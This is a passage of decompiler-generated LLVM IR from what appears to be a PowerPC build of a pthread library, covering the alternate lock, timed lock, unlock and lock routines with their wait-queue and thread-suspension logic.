  %v1_100099dc = inttoptr i32 %v0_100099d8 to i32*
  %v2_100099dc = call i32 @wait_node_free(i32* %v1_100099dc)
  %v0_100099e0 = load i32, i32* @r29, align 4
  %v1_100099e0 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009a18.backedge

dec_label_pc_100099f4:                            ; preds = %dec_label_pc_100099c8
  %v1_100099f4 = add i32 %v0_10009a10, 4
  %v2_100099f4 = inttoptr i32 %v1_100099f4 to i32*
  %v3_100099f4 = load i32, i32* %v2_100099f4, align 4
  store i32 %v3_100099f4, i32* @r9, align 4
  %v1_100099f8 = add i32 %v3_100099f4, 24
  %v2_100099f8 = inttoptr i32 %v1_100099f8 to i32*
  %v3_100099f8 = load i32, i32* %v2_100099f8, align 4
  %v1_100099fc = load i32, i32* @r27, align 4
  %v2_100099fc = icmp slt i32 %v3_100099f8, %v1_100099fc
  br i1 %v2_100099fc, label %dec_label_pc_10009a10, label %dec_label_pc_10009a04

dec_label_pc_10009a04:                            ; preds = %dec_label_pc_100099f4
  store i32 %v3_100099f8, i32* @r27, align 4
  store i32 %v0_10009a08, i32* @r26, align 4
  store i32 %v0_10009a10, i32* @r28, align 4
  br label %dec_label_pc_10009a10

dec_label_pc_10009a10:                            ; preds = %dec_label_pc_100099f4, %dec_label_pc_10009a04
  store i32 %v0_10009a10, i32* @r29, align 4
  br label %dec_label_pc_10009a18.backedge

dec_label_pc_10009a18.backedge:                   ; preds = %dec_label_pc_10009a10, %dec_label_pc_100099d4
  %v0_10009a24 = phi i32 [ %v1_100099e0, %dec_label_pc_100099d4 ], [ %v0_10009a2411, %dec_label_pc_10009a10 ]
  %v0_10009a20 = phi i32 [ %v0_100099e0, %dec_label_pc_100099d4 ], [ %v0_10009a10, %dec_label_pc_10009a10 ]
  %storemerge.in = inttoptr i32 %v0_10009a20 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_10009a18 = icmp eq i32 %storemerge, 1
  br i1 %v3_10009a18, label %dec_label_pc_10009a2c, label %dec_label_pc_100099c8

dec_label_pc_10009a2c:                            ; preds = %dec_label_pc_10009a18.backedge
  %v0_10009a30.pre = load i32, i32* @r27, align 4
  %v4_10009a30 = icmp eq i32 %v0_10009a30.pre, -2147483648
  br i1 %v4_10009a30, label %dec_label_pc_10009978.outer, label %dec_label_pc_10009a40

dec_label_pc_10009a40:                            ; preds = %dec_label_pc_10009a2c
  %v0_10009a38 = load i32, i32* @r28, align 4
  %v1_10009a38 = add i32 %v0_10009a38, 8
  store i32 %v1_10009a38, i32* @r9, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10009a44 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10009a44, label %dec_label_pc_10009a60, label %dec_label_pc_10009978.outer

dec_label_pc_10009a60:                            ; preds = %dec_label_pc_10009a40
  %v0_10009a60 = load i32, i32* @r26, align 4
  store i32 268474988, i32* @lr, align 4
  %v3_10009a68 = inttoptr i32 %v0_10009a38 to i32*
  %v4_10009a68 = call i32 @wait_node_dequeue(i32 %v0_10009a60, i32* %v3_10009a68, i32 %v0_10009a38)
  %v0_10009a6c = load i32, i32* @r28, align 4
  %v1_10009a6c = add i32 %v0_10009a6c, 4
  %v2_10009a6c = inttoptr i32 %v1_10009a6c to i32*
  %v3_10009a6c = load i32, i32* %v2_10009a6c, align 4
  store i32 %v3_10009a6c, i32* @r3, align 4
  store i32 %v0_10009960, i32* @lr, align 4
  %v1_10009a80 = call i32 @restart.9(i32 %v3_10009a6c)
  br label %dec_label_pc_10009a84

dec_label_pc_10009a84.loopexit:                   ; preds = %dec_label_pc_1000998c
  br label %dec_label_pc_10009a84

dec_label_pc_10009a84:                            ; preds = %dec_label_pc_10009a84.loopexit, %dec_label_pc_10009a60
  %v0_10009a94 = phi i32 [ %v1_10009a80, %dec_label_pc_10009a60 ], [ %v2_10009978, %dec_label_pc_10009a84.loopexit ]
  ret i32 %v0_10009a94

; uselistorder directives
  uselistorder i32 %v0_10009a38, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10009a20, { 1, 0 }
  uselistorder i32 %v0_10009a24, { 1, 0, 2 }
  uselistorder i32 %v0_10009a10, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v2_10009978, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v0_10009a247.ph, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009a10, { 1, 0 }
  uselistorder label %dec_label_pc_100099c8, { 1, 0 }
  uselistorder label %dec_label_pc_10009978, { 1, 0 }
}

define i32 @suspend.10() local_unnamed_addr {
entry:
  store i32 268475048, i32* @lr, align 4
  %v0_10009aa4 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10009aa4

; uselistorder directives
  uselistorder i32 ()* @__pthread_wait_for_restart_signal, { 0, 3, 5, 1, 2, 4, 6 }
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r11, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* @r3, align 4
  br label %dec_label_pc_10009ad0

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009b14, %entry
  %v0_10009ad4 = phi i32 [ %v0_10009ad44, %dec_label_pc_10009b14 ], [ %arg2, %entry ]
  %v2_10009ad0 = load i32, i32* %arg1, align 4
  store i32 %v2_10009ad0, i32* @r9, align 4
  %v3_10009adc = icmp eq i32 %v2_10009ad0, 0
  br i1 %v3_10009adc, label %dec_label_pc_10009b00, label %dec_label_pc_10009ae4

dec_label_pc_10009ae4:                            ; preds = %dec_label_pc_10009ad0
  %v3_10009ad4 = icmp eq i32 %v0_10009ad4, 0
  br i1 %v3_10009ad4, label %dec_label_pc_10009ae8, label %dec_label_pc_10009aec

dec_label_pc_10009ae8:                            ; preds = %dec_label_pc_10009ae4
  %v0_10009ae8 = load i32, i32* @r2, align 4
  store i32 %v0_10009ae8, i32* @r3, align 4
  br label %dec_label_pc_10009aec

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009ae4, %dec_label_pc_10009ae8
  %v0_10009ad43 = phi i32 [ %v0_10009ad4, %dec_label_pc_10009ae4 ], [ %v0_10009ae8, %dec_label_pc_10009ae8 ]
  br label %dec_label_pc_10009b00

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009aec, %dec_label_pc_10009ad0
  %v0_10009ad44 = phi i32 [ %v0_10009ad4, %dec_label_pc_10009ad0 ], [ %v0_10009ad43, %dec_label_pc_10009aec ]
  %r8.promoted = load i32, i32* @r8, align 4
  %.pre = xor i32 %r8.promoted, %v2_10009ad0
  %v5_10009b04 = icmp eq i32 %.pre, 0
  br i1 %v5_10009b04, label %dec_label_pc_10009b20, label %dec_label_pc_10009b14

dec_label_pc_10009b14:                            ; preds = %dec_label_pc_10009b00
  store i32 %.pre, i32* @r8, align 4
  br label %dec_label_pc_10009ad0

dec_label_pc_10009b20:                            ; preds = %dec_label_pc_10009b00
  store i32 0, i32* @r8, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10009adc, label %dec_label_pc_10009b2c, label %dec_label_pc_10009b28

dec_label_pc_10009b28:                            ; preds = %dec_label_pc_10009b20
  store i32 ptrtoint (i32* @global_var_10009b2c.357 to i32), i32* @lr, align 4
  %v0_10009b28 = call i32 @suspend.10()
  br label %dec_label_pc_10009b2c

dec_label_pc_10009b2c:                            ; preds = %dec_label_pc_10009b20, %dec_label_pc_10009b28
  %v0_10009b3c = phi i32 [ %v0_10009ad44, %dec_label_pc_10009b20 ], [ %v0_10009b28, %dec_label_pc_10009b28 ]
  ret i32 %v0_10009b3c

; uselistorder directives
  uselistorder i32 %v0_10009ad4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009b2c, { 1, 0 }
  uselistorder label %dec_label_pc_10009aec, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10009b44 = load i32, i32* @lr, align 4
  store i32 %v0_10009b44, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268475240, i32* @lr, align 4
  %v1_10009b64 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_1002f048.355 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v3_10009b70 = load i32, i32* @global_var_1002f044.356, align 4
  store i32 %v3_10009b70, i32* %r0.global-to-local, align 4
  %v3_10009b74 = icmp eq i32 %v3_10009b70, 0
  br i1 %v3_10009b74, label %dec_label_pc_10009b88, label %dec_label_pc_10009b7c

dec_label_pc_10009b7c:                            ; preds = %entry
  store i32 %v3_10009b70, i32* @r31, align 4
  %v1_10009b80 = inttoptr i32 %v3_10009b70 to i32*
  %v2_10009b80 = load i32, i32* %v1_10009b80, align 4
  store i32 %v2_10009b80, i32* %r0.global-to-local, align 4
  store i32 %v2_10009b80, i32* @global_var_1002f044.356, align 4
  br label %dec_label_pc_10009b88

dec_label_pc_10009b88:                            ; preds = %entry, %dec_label_pc_10009b7c
  %v0_10009bb0.pr = phi i1 [ false, %dec_label_pc_10009b7c ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_1002f048.355, align 4
  br i1 %v0_10009bb0.pr, label %dec_label_pc_10009bb0, label %dec_label_pc_10009bb0.thread

dec_label_pc_10009bb0.thread:                     ; preds = %dec_label_pc_10009b88
  br label %dec_label_pc_10009bc8

dec_label_pc_10009bb0:                            ; preds = %dec_label_pc_10009b88
  store i32 12, i32* @r3, align 4
  store i32 268475308, i32* @lr, align 4
  %v0_10009ba8 = call i32 @malloc()
  store i32 %v0_10009ba8, i32* @r31, align 4
  %v3_10009bb0 = icmp eq i32 %v0_10009ba8, 0
  br i1 %v3_10009bb0, label %dec_label_pc_10009bb8, label %dec_label_pc_10009bc8

dec_label_pc_10009bb8:                            ; preds = %dec_label_pc_10009bb0
  %v0_10009bb8 = load i32, i32* @r29, align 4
  %v0_10009bbc = load i32, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10009bc4.358 to i32), i32* @lr, align 4
  %v2_10009bc0 = inttoptr i32 %v0_10009bb8 to i32*
  %v3_10009bc0 = call i32 @__pthread_alt_lock(i32* %v2_10009bc0, i32 %v0_10009bbc)
  br label %dec_label_pc_10009c78

dec_label_pc_10009bc8:                            ; preds = %dec_label_pc_10009bb0, %dec_label_pc_10009bb0.thread, %dec_label_pc_10009c10
  %v0_10009bc8 = load i32, i32* @r29, align 4
  %v1_10009bc8 = inttoptr i32 %v0_10009bc8 to i32*
  %v2_10009bc8 = load i32, i32* %v1_10009bc8, align 4
  store i32 %v2_10009bc8, i32* %r9.global-to-local, align 4
  %v0_10009bcc = load i32, i32* @r30, align 4
  store i32 1, i32* @r11, align 4
  %v3_10009bd4 = icmp eq i32 %v2_10009bc8, 0
  br i1 %v3_10009bd4, label %dec_label_pc_10009bc8.dec_label_pc_10009bec_crit_edge, label %dec_label_pc_10009bdc

dec_label_pc_10009bc8.dec_label_pc_10009bec_crit_edge: ; preds = %dec_label_pc_10009bc8
  %v1_10009bf0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009bfc

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009bc8
  %v3_10009bcc = icmp eq i32 %v0_10009bcc, 0
  br i1 %v3_10009bcc, label %dec_label_pc_10009be0, label %dec_label_pc_10009be4

dec_label_pc_10009be0:                            ; preds = %dec_label_pc_10009bdc
  %v0_10009be0 = load i32, i32* @r2, align 4
  store i32 %v0_10009be0, i32* @r30, align 4
  br label %dec_label_pc_10009be4

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bdc, %dec_label_pc_10009be0
  %v0_10009be4 = phi i32 [ %v0_10009bcc, %dec_label_pc_10009bdc ], [ %v0_10009be0, %dec_label_pc_10009be0 ]
  %v1_10009be4 = load i32, i32* @r31, align 4
  %v2_10009be4 = add i32 %v1_10009be4, 4
  %v3_10009be4 = inttoptr i32 %v2_10009be4 to i32*
  store i32 %v0_10009be4, i32* %v3_10009be4, align 4
  %v0_10009be8 = load i32, i32* @r31, align 4
  store i32 %v0_10009be8, i32* @r11, align 4
  %v0_10009bf0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009bfc

dec_label_pc_10009bfc:                            ; preds = %dec_label_pc_10009be4, %dec_label_pc_10009bc8.dec_label_pc_10009bec_crit_edge
  %v1_10009bf0 = phi i32 [ %v1_10009bf0.pre, %dec_label_pc_10009bc8.dec_label_pc_10009bec_crit_edge ], [ %v0_10009be8, %dec_label_pc_10009be4 ]
  %v0_10009bf0 = phi i32 [ 0, %dec_label_pc_10009bc8.dec_label_pc_10009bec_crit_edge ], [ %v0_10009bf0.pre, %dec_label_pc_10009be4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10009bf0 = inttoptr i32 %v1_10009bf0 to i32*
  store i32 %v0_10009bf0, i32* %v2_10009bf0, align 4
  %v0_10009bf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009bf4 = load i32, i32* @r31, align 4
  %v2_10009bf4 = add i32 %v1_10009bf4, 8
  %v3_10009bf4 = inttoptr i32 %v2_10009bf4 to i32*
  store i32 %v0_10009bf4, i32* %v3_10009bf4, align 4
  %v0_10009c00 = load i32, i32* %r9.global-to-local, align 4
  %r0.promoted = load i32, i32* %r0.global-to-local, align 4
  %.pre = xor i32 %r0.promoted, %v0_10009c00
  %v5_10009c00 = icmp eq i32 %.pre, 0
  br i1 %v5_10009c00, label %dec_label_pc_10009c1c, label %dec_label_pc_10009c10

dec_label_pc_10009c10:                            ; preds = %dec_label_pc_10009bfc
  store i32 %.pre, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10009bc8

dec_label_pc_10009c1c:                            ; preds = %dec_label_pc_10009bfc
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10009c1c = icmp eq i32 %v0_10009c00, 0
  br i1 %v3_10009c1c, label %dec_label_pc_10009c6c, label %dec_label_pc_10009c24

dec_label_pc_10009c24:                            ; preds = %dec_label_pc_10009c1c
  %v0_10009c24 = load i32, i32* @r28, align 4
  %v0_10009c28 = load i32, i32* @r30, align 4
  store i32 268475440, i32* @lr, align 4
  %v2_10009c2c = inttoptr i32 %v0_10009c24 to i32*
  %v3_10009c2c = call i32 @__pthread_timedsuspend_new(i32 %v0_10009c28, i32* %v2_10009c2c)
  %v3_10009c30 = icmp eq i32 %v3_10009c2c, 0
  br i1 %v3_10009c30, label %dec_label_pc_10009c40, label %dec_label_pc_10009c6c

dec_label_pc_10009c40:                            ; preds = %dec_label_pc_10009c24
  %v0_10009c38 = load i32, i32* @r31, align 4
  %v1_10009c38 = add i32 %v0_10009c38, 8
  store i32 %v1_10009c38, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10009c44 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10009c44, label %dec_label_pc_10009c7c, label %dec_label_pc_10009c64

dec_label_pc_10009c64:                            ; preds = %dec_label_pc_10009c40
  %v0_10009c64 = load i32, i32* @r30, align 4
  store i32 %v0_10009c64, i32* @r3, align 4
  store i32 268475500, i32* @lr, align 4
  %v0_10009c68 = call i32 @suspend.10()
  br label %dec_label_pc_10009c6c

dec_label_pc_10009c6c:                            ; preds = %dec_label_pc_10009c24, %dec_label_pc_10009c1c, %dec_label_pc_10009c64
  %v0_10009c6c = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10009c74.359 to i32), i32* @lr, align 4
  %v1_10009c70 = inttoptr i32 %v0_10009c6c to i32*
  %v2_10009c70 = call i32 @wait_node_free(i32* %v1_10009c70)
  br label %dec_label_pc_10009c78

dec_label_pc_10009c78:                            ; preds = %dec_label_pc_10009bb8, %dec_label_pc_10009c6c
  br label %dec_label_pc_10009c7c

dec_label_pc_10009c7c:                            ; preds = %dec_label_pc_10009c40, %dec_label_pc_10009c78
  %v0_10009c8c = phi i32 [ 0, %dec_label_pc_10009c40 ], [ 1, %dec_label_pc_10009c78 ]
  store i32 %v0_10009b44, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009c8c

; uselistorder directives
  uselistorder i32 %v3_10009b70, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 10, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32*)* @__pthread_timedsuspend_new, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_10009c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10009c78, { 1, 0 }
  uselistorder label %dec_label_pc_10009c6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009be4, { 1, 0 }
  uselistorder label %dec_label_pc_10009bc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009b88, { 1, 0 }
}

define i32 @__pthread_unlock() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009c90 = load i32, i32* @lr, align 4
  br label %dec_label_pc_10009cc8

dec_label_pc_10009cac:                            ; preds = %dec_label_pc_10009cc8
  %.pre = xor i32 %r0.promoted, 1
  %v5_10009cb0 = icmp eq i32 %.pre, 0
  br i1 %v5_10009cb0, label %dec_label_pc_10009d98, label %dec_label_pc_10009cc8

dec_label_pc_10009cc8:                            ; preds = %dec_label_pc_10009d2c, %dec_label_pc_10009cac, %entry
  %r0.promoted = phi i32 [ %v0_10009c90, %entry ], [ %.pre, %dec_label_pc_10009cac ], [ %v1_10009d24, %dec_label_pc_10009d2c ]
  %v0_10009cc8 = load i32, i32* @r3, align 4
  %v1_10009cc8 = inttoptr i32 %v0_10009cc8 to i32*
  %v2_10009cc8 = load i32, i32* %v1_10009cc8, align 4
  store i32 %v2_10009cc8, i32* @r10, align 4
  %v3_10009ccc = icmp eq i32 %v2_10009cc8, 1
  br i1 %v3_10009ccc, label %dec_label_pc_10009cac, label %dec_label_pc_10009cd4

dec_label_pc_10009cd4:                            ; preds = %dec_label_pc_10009cc8
  %v1_10009cd4 = call i32 @__asm_rlwinm(i32 %v2_10009cc8, i32 0, i32 0, i32 30)
  store i32 %v1_10009cd4, i32* @r8, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_10009cd4, i32* %r9.global-to-local, align 4
  %v0_10009ce4 = load i32, i32* @r3, align 4
  store i32 %v0_10009ce4, i32* %r7.global-to-local, align 4
  store i32 %v0_10009ce4, i32* @r11, align 4
  %v3_10009d104 = icmp eq i32 %v1_10009cd4, 0
  br i1 %v3_10009d104, label %dec_label_pc_10009d18.thread, label %dec_label_pc_10009cf0

dec_label_pc_10009d18.thread:                     ; preds = %dec_label_pc_10009cd4
  br label %dec_label_pc_10009d2c

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009cd4, %dec_label_pc_10009d04.dec_label_pc_10009cf0_crit_edge
  %v1_10009cf4 = phi i32 [ %v1_10009cf4.pre, %dec_label_pc_10009d04.dec_label_pc_10009cf0_crit_edge ], [ 0, %dec_label_pc_10009cd4 ]
  %v0_10009d04 = phi i32 [ %v1_10009d0c, %dec_label_pc_10009d04.dec_label_pc_10009cf0_crit_edge ], [ %v1_10009cd4, %dec_label_pc_10009cd4 ]
  %v1_10009cf0 = add i32 %v0_10009d04, 24
  %v2_10009cf0 = inttoptr i32 %v1_10009cf0 to i32*
  %v3_10009cf0 = load i32, i32* %v2_10009cf0, align 4
  %v2_10009cf4 = icmp slt i32 %v3_10009cf0, %v1_10009cf4
  br i1 %v2_10009cf4, label %dec_label_pc_10009d04, label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009cf0
  store i32 %v3_10009cf0, i32* %r6.global-to-local, align 4
  %v0_10009d00 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10009d00, i32* @r11, align 4
  br label %dec_label_pc_10009d04

dec_label_pc_10009d04:                            ; preds = %dec_label_pc_10009cf0, %dec_label_pc_10009cfc
  %v1_10009d04 = add i32 %v0_10009d04, 12
  %v2_10009d04 = inttoptr i32 %v1_10009d04 to i32*
  %v3_10009d04 = load i32, i32* %v2_10009d04, align 4
  store i32 %v1_10009d04, i32* %r7.global-to-local, align 4
  %v1_10009d0c = call i32 @__asm_rlwinm(i32 %v3_10009d04, i32 0, i32 0, i32 30)
  store i32 %v1_10009d0c, i32* %r9.global-to-local, align 4
  %v3_10009d10 = icmp eq i32 %v1_10009d0c, 0
  br i1 %v3_10009d10, label %dec_label_pc_10009d18, label %dec_label_pc_10009d04.dec_label_pc_10009cf0_crit_edge

dec_label_pc_10009d04.dec_label_pc_10009cf0_crit_edge: ; preds = %dec_label_pc_10009d04
  %v1_10009cf4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10009cf0

dec_label_pc_10009d18:                            ; preds = %dec_label_pc_10009d04
  %v0_10009d18.pre = load i32, i32* @r11, align 4
  %v1_10009d18.pre = load i32, i32* @r3, align 4
  %v4_10009d18 = icmp eq i32 %v0_10009d18.pre, %v1_10009d18.pre
  br i1 %v4_10009d18, label %dec_label_pc_10009d18.dec_label_pc_10009d2c_crit_edge, label %dec_label_pc_10009d4c

dec_label_pc_10009d18.dec_label_pc_10009d2c_crit_edge: ; preds = %dec_label_pc_10009d18
  %v0_10009d20.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10009d2c

dec_label_pc_10009d2c:                            ; preds = %dec_label_pc_10009d18.dec_label_pc_10009d2c_crit_edge, %dec_label_pc_10009d18.thread
  %v0_10009d20 = phi i32 [ %v0_10009d20.pre, %dec_label_pc_10009d18.dec_label_pc_10009d2c_crit_edge ], [ 0, %dec_label_pc_10009d18.thread ]
  %v1_10009d20 = add i32 %v0_10009d20, 12
  %v2_10009d20 = inttoptr i32 %v1_10009d20 to i32*
  %v3_10009d20 = load i32, i32* %v2_10009d20, align 4
  %v1_10009d24 = call i32 @__asm_rlwinm(i32 %v3_10009d20, i32 0, i32 0, i32 30)
  %r9.promoted = load i32, i32* %r9.global-to-local, align 4
  %.pre14 = xor i32 %r9.promoted, %v2_10009cc8
  %v5_10009d30 = icmp eq i32 %.pre14, 0
  store i32 %.pre14, i32* @r9, align 4
  br i1 %v5_10009d30, label %dec_label_pc_10009d88, label %dec_label_pc_10009cc8

dec_label_pc_10009d4c:                            ; preds = %dec_label_pc_10009d18
  %v1_10009d4c = inttoptr i32 %v0_10009d18.pre to i32*
  %v2_10009d4c = load i32, i32* %v1_10009d4c, align 4
  %v1_10009d50 = call i32 @__asm_rlwinm(i32 %v2_10009d4c, i32 0, i32 0, i32 30)
  store i32 %v1_10009d50, i32* @r8, align 4
  %v1_10009d54 = add i32 %v1_10009d50, 12
  %v2_10009d54 = inttoptr i32 %v1_10009d54 to i32*
  %v3_10009d54 = load i32, i32* %v2_10009d54, align 4
  %v1_10009d58 = load i32, i32* @r11, align 4
  %v2_10009d58 = inttoptr i32 %v1_10009d58 to i32*
  store i32 %v3_10009d54, i32* %v2_10009d58, align 4
  br label %dec_label_pc_10009d6c

dec_label_pc_10009d6c:                            ; preds = %dec_label_pc_10009d4c, %dec_label_pc_10009d6c
  %v0_10009d60 = load i32, i32* @r3, align 4
  %v1_10009d60 = inttoptr i32 %v0_10009d60 to i32*
  %v2_10009d60 = load i32, i32* %v1_10009d60, align 4
  store i32 %v2_10009d60, i32* %r9.global-to-local, align 4
  %v1_10009d68 = call i32 @__asm_rlwinm(i32 %v2_10009d60, i32 0, i32 0, i32 30)
  %r11.promoted = load i32, i32* @r11, align 4
  %.pre15 = xor i32 %r11.promoted, %v2_10009d60
  %v5_10009d70 = icmp eq i32 %.pre15, 0
  store i32 %.pre15, i32* @r11, align 4
  br i1 %v5_10009d70, label %dec_label_pc_10009d88, label %dec_label_pc_10009d6c

dec_label_pc_10009d88:                            ; preds = %dec_label_pc_10009d2c, %dec_label_pc_10009d6c
  %v0_10009d8c = load i32, i32* @r8, align 4
  store i32 %v0_10009d8c, i32* @r3, align 4
  %v2_10009d90 = add i32 %v0_10009d8c, 12
  %v3_10009d90 = inttoptr i32 %v2_10009d90 to i32*
  store i32 0, i32* %v3_10009d90, align 4
  store i32 268475800, i32* @lr, align 4
  %v1_10009d94 = call i32 @restart.9(i32 %v0_10009d8c)
  br label %dec_label_pc_10009d98

dec_label_pc_10009d98:                            ; preds = %dec_label_pc_10009cac, %dec_label_pc_10009d88
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10009d0c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009d98, { 1, 0 }
  uselistorder label %dec_label_pc_10009d88, { 1, 0 }
  uselistorder label %dec_label_pc_10009d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10009d04, { 1, 0 }
  uselistorder label %dec_label_pc_10009cf0, { 1, 0 }
}

define i32 @__pthread_lock() local_unnamed_addr {
entry:
  %v0_10009db8 = load i32, i32* @r3, align 4
  store i32 %v0_10009db8, i32* @r30, align 4
  %v0_10009dc0 = load i32, i32* @r4, align 4
  store i32 %v0_10009dc0, i32* @r31, align 4
  %v1_10009dc4 = inttoptr i32 %v0_10009db8 to i32*
  %v2_10009dc4 = load i32, i32* %v1_10009dc4, align 4
  store i32 %v2_10009dc4, i32* @r9, align 4
  %v3_10009dc8 = icmp eq i32 %v2_10009dc4, 0
  br i1 %v3_10009dc8, label %dec_label_pc_10009dd4, label %dec_label_pc_10009df4

dec_label_pc_10009dd4:                            ; preds = %entry
  %r10.promoted10 = load i32, i32* @r10, align 4
  %v5_10009dd8 = icmp eq i32 %r10.promoted10, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_10009dd8, label %dec_label_pc_10009e8c, label %dec_label_pc_10009df4

dec_label_pc_10009df4:                            ; preds = %entry, %dec_label_pc_10009dd4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10009df8

dec_label_pc_10009df8:                            ; preds = %dec_label_pc_10009df8.backedge, %dec_label_pc_10009df4
  %v0_10009e20.pr = phi i32 [ %v0_10009e20.pr.pre, %dec_label_pc_10009df8.backedge ], [ %v0_10009dc0, %dec_label_pc_10009df4 ]
  %v0_10009df8 = phi i32 [ %v0_10009df8.pre, %dec_label_pc_10009df8.backedge ], [ %v0_10009db8, %dec_label_pc_10009df4 ]
  %v1_10009df8 = inttoptr i32 %v0_10009df8 to i32*
  %v2_10009df8 = load i32, i32* %v1_10009df8, align 4
  store i32 %v2_10009df8, i32* @r9, align 4
  store i32 1, i32* @r11, align 4
  %v1_10009e00 = urem i32 %v2_10009df8, 2
  %v3_10009e00 = icmp eq i32 %v1_10009e00, 0
  br i1 %v3_10009e00, label %dec_label_pc_10009e20, label %dec_label_pc_10009e0c

dec_label_pc_10009e0c:                            ; preds = %dec_label_pc_10009df8
  %v3_10009e0c = icmp eq i32 %v0_10009e20.pr, 0
  br i1 %v3_10009e0c, label %dec_label_pc_10009e14, label %dec_label_pc_10009e18

dec_label_pc_10009e14:                            ; preds = %dec_label_pc_10009e0c
  %v0_10009e14 = load i32, i32* @r2, align 4
  store i32 %v0_10009e14, i32* @r31, align 4
  br label %dec_label_pc_10009e18

dec_label_pc_10009e18:                            ; preds = %dec_label_pc_10009e0c, %dec_label_pc_10009e14
  %v0_10009e18 = phi i32 [ %v0_10009e20.pr, %dec_label_pc_10009e0c ], [ %v0_10009e14, %dec_label_pc_10009e14 ]
  store i32 0, i32* @r11, align 4
  br label %dec_label_pc_10009e20

dec_label_pc_10009e20:                            ; preds = %dec_label_pc_10009df8, %dec_label_pc_10009e18
  %v1_10009e28 = phi i32 [ %v0_10009e18, %dec_label_pc_10009e18 ], [ %v0_10009e20.pr, %dec_label_pc_10009df8 ]
  %v3_10009e20 = icmp eq i32 %v1_10009e28, 0
  br i1 %v3_10009e20, label %dec_label_pc_10009e30, label %dec_label_pc_10009e28

dec_label_pc_10009e28:                            ; preds = %dec_label_pc_10009e20
  %v2_10009e28 = add i32 %v1_10009e28, 12
  %v3_10009e28 = inttoptr i32 %v2_10009e28 to i32*
  store i32 %v2_10009df8, i32* %v3_10009e28, align 4
  %v0_10009e34.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10009e30

dec_label_pc_10009e30:                            ; preds = %dec_label_pc_10009e20, %dec_label_pc_10009e28
  %v0_10009e34 = phi i32 [ %v0_10009e34.pre, %dec_label_pc_10009e28 ], [ %v2_10009df8, %dec_label_pc_10009e20 ]
  %r10.promoted = load i32, i32* @r10, align 4
  %.pre = xor i32 %r10.promoted, %v0_10009e34
  %v5_10009e34 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r10, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_10009e34, label %dec_label_pc_10009e50, label %dec_label_pc_10009e44.dec_label_pc_10009df8.backedge_crit_edge

dec_label_pc_10009e44.dec_label_pc_10009df8.backedge_crit_edge: ; preds = %dec_label_pc_10009e30
